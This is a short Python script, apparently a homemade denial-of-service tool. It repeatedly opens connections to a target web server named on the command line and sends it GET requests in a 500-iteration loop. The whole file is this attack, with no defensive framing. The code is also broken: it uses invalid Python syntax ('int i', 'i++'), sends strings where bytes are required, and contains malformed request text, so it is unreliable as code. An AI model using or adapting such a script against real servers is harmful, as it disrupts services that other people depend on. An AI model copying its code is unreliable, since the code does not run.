
import socket
import sys
import os

int i
i = 0
def DOS():
	#creating connection to the server
	connection= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	'''AF_INET is an address familiy that is used to designate the
	type of addresses that your socket can communicate with ipv4'''
	connection.connect((sys.argv[1],80))
	# using the port 80
	print("GET "+ sys.argv[2] + "DATA")
	#sending requests
	connection.send("GET " + sys.argv[2] + "DATA \n")
	connection.send("HOST :  "+ sys.argv[1]+ "/n/n")
	connection.close()

while(i<500):
	DOS();
	i++



